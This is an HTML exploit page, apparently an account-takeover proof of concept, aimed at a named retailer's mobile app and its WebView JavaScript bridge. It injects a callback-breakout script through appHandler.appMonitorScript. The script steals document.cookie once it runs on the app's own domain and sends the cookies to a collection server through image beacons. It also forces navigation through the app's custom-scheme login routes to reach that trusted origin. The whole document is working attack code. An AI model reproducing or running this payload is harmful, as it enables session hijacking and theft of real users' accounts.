<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>ATO-v4</title></head>
<body style="background:#111;color:#0f0;font-family:monospace;padding:16px;font-size:13px">
<h3 style="color:#c9a96e">ATO v4 (in-place via login route)</h3>
<div id="log"></div>
<script>
window.sep = {};
sep._onSuccess = function(){};
sep._onFailure = function(){};
sep._onCancel  = function(){};

function L(s){ document.getElementById('log').innerHTML += s + '<br>'; }
function beacon(tag, extra){
  new Image().src = 'http://127.0.0.1:8899/x?t=' + tag +
    '&d=' + encodeURIComponent(extra || '').substring(0, 600);
}

window.__p = "0);(function(){var c=document.cookie,o=location.origin;if(o.indexOf('sephora.cn')>=0){new Image().src='http://127.0.0.1:8899/x?t=WIN&d='+encodeURIComponent(o+'|||'+c.substring(0,600));try{var d=document.createElement('div');d.style.cssText='position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#c00;color:#fff;padding:14px;font:700 14px monospace;word-break:break-all';d.textContent='ATO-WIN cookies('+c.length+'): '+c.substring(0,180);document.body.appendChild(d);}catch(e){}return;}if(!window.__n)window.__n=0;window.__n++;new Image().src='http://127.0.0.1:8899/x?t=sweep'+window.__n+'&d='+encodeURIComponent(o);if(window.__n<80){try{appHandler.appMonitorScript('getGPS',window.__p,'{}');}catch(e){}}})();//";

beacon('page-load', location.href);
L('page: ' + location.href);

if (typeof appHandler === 'undefined') {
  L('NO bridge'); beacon('no-bridge','');
} else {
  L('bridge OK');
  beacon('bridge-ok','');

  appHandler.appMonitorScript('getGPS', window.__p, '{}');
  appHandler.appMonitorScript('shareApp', window.__p,
    '{"title":"t","content":"c","shareUrl":"https://m.sephora.cn/"}');
  L('armed: sweeper + shareApp');

  var hb = 0;
  setInterval(function(){ beacon('hb',''+(++hb)); }, 2000);

  // t=4s: 用App自己的login路由原地导航 (redirect extra → shouldOverrideUrlLoading 原地分支)
  function tryNav(tag, dl) {
    beacon('nav-'+tag, dl.substring(0, 120));
    L('nav ' + tag + ': ' + dl);
    for (var i = 0; i < 5; i++) {
      try { appHandler.appMonitorScript('getGPS', window.__p, '{}'); } catch(e){}
    }
    location.href = dl;
  }
  setTimeout(function(){ tryNav('login-route',
    'sephora://foundation/login?historyLocation=' + encodeURIComponent('https://m.sephora.cn/')); }, 4000);

  // 若 t=10s 页面还活着(导航失败) → 依次尝试备选
  setTimeout(function(){ tryNav('alt-host',
    'sephora://account/login?historyLocation=' + encodeURIComponent('https://m.sephora.cn/')); }, 10000);
  setTimeout(function(){ tryNav('openurl',
    'sephora://openurl?url=' + encodeURIComponent('https://m.sephora.cn/')); }, 16000);
}
</script></body></html>
